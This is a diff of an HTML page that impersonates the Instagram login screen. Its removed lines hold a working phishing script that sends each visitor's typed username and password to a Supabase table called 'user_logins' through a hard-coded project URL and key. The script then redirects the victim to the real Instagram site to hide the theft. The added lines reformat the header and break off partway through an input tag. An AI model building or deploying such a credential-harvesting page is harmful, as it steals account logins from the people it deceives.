@@ -87,51 +87,9 @@
 <body>
 
     <div class="mobile-container">
-        <header><h1 class="logo">Instagram</h1></header>
+        <header>
+            <h1 class="logo">Instagram</h1>
+        </header>
+
         <form class="login-form" id="authForm">
-            <input type="text" id="userInput" placeholder="Phone number, username, or email" required>
-            <input type="password" id="passInput" placeholder="Password" required>
-            <button type="submit" id="submitBtn" class="login-btn">Log In</button>
-        </form>
-        <div class="or-container">
-            <div class="line"></div><div class="or-text">OR</div><div class="line"></div>
-        </div>
-        <div class="fb-login">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2023.png" alt="fb" class="fb-icon">
-            <span>Log in with Facebook</span>
-        </div>
-        <a href="#" class="forgot-password">Forgot password?</a>
-    </div>
-    <footer class="signup-footer"><p>Don't have an account? <a href="#">Sign up.</a></p></footer>
-
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script>
-        // Use your Supabase keys here
-        const SUPABASE_URL = 'https://mllxnrqjdzpiswpaappa.supabase.co'; 
-        const SUPABASE_ANON_KEY = 'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ';
-
-        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-        document.getElementById('authForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerText = "Connecting...";
-
-            const { error } = await _supabase.from('user_logins').insert([{ 
-                identifier: document.getElementById('userInput').value, 
-                password: document.getElementById('passInput').value 
-            }]);
-
-            if (error) {
-                alert("Error: " + error.message);
-                btn.disabled = false;
-                btn.innerText = "Log In";
-            } else {
-                window.location.href = "https://www.instagram.com";
-            }
-        });
-    </script>
-</body>
-</html>
-
+            <input type="text" id
